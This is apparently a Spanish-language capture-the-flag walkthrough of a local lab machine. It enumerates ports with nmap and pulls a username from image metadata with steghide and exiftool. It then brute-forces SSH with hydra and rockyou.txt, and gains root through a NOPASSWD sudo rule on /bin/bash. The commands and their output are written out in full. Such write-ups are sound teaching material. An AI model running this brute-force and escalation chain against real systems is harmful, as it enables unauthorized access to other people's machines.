#abusing-sudo #stego #steghide #exiftool #hydra #password-brute-force 

![](../../../Images/Pasted%20image%2020241008070451.png)
# Enumeración

## Nmap

El escaneo de **nmap** nos enseña la existencia de un servicio SSH i un servicio HTTP funcionando.

```
> nmap --open --min-rate 10000 -Pn -n -oN scans/allTCPPorts $target

Nmap scan report for 172.17.0.2
Host is up (0.000013s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```

```
> nmap -oN scans/targetedTCPPorts -sCV $target -p 22,80                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 07:06 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.07 seconds
```

## Website (80 TCP Port)

En el sitio web nos encontramos con solo una imagen.

![](../../../Images/Pasted%20image%2020241008070656.png)

Descargamos la imagen en nuestro sistema de ataque y nos ponemos a investigarla.
# Usuario Borazuwarah

Hacemos un stego con `steghide` y obtenemos algo de información no importante.

```
> steghide extract -sf imagen.jpeg
Enter passphrase:

wrote extracted data to "secreto.txt".

> cat secreto.txt

Sigue buscando, aquí no está to solución
aunque te dejo una pista....
sigue buscando en la imagen!!!
```

Luego examinamos los metadatos de la imagen y conseguimos dar con un nombre de usuario.

```
> exiftool imagen.jpeg

ExifTool Version Number         : 12.76
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:10:07 21:32:57+02:00
File Access Date/Time           : 2024:10:07 21:33:43+02:00
File Inode Change Date/Time     : 2024:10:07 21:32:57+02:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```

Ahora, con el nombre de usuario podemos hacer fuerza bruta contra el servicio SSH con `hydra`.

```
> hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 06:48:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 06:48:12
```

Conseguimos acceder al sistema mediante SSH.

# Escalada de privilegios

Una vez dentro investigamos los comandos que podemos ejecutar con permisos `sudo`.

```
borazuwarah@7dd5484e294a:~$ sudo -l
Matching Defaults entries for borazuwarah on 7dd5484e294a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on 7dd5484e294a:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

Nos encontramos que podemos ejecutar el binario`/bin/bash` con permisos ``sudo`` y sin contraseña.

```
borazuwarah@7dd5484e294a:~$ sudo /bin/bash
root@7dd5484e294a:/home/borazuwarah#
```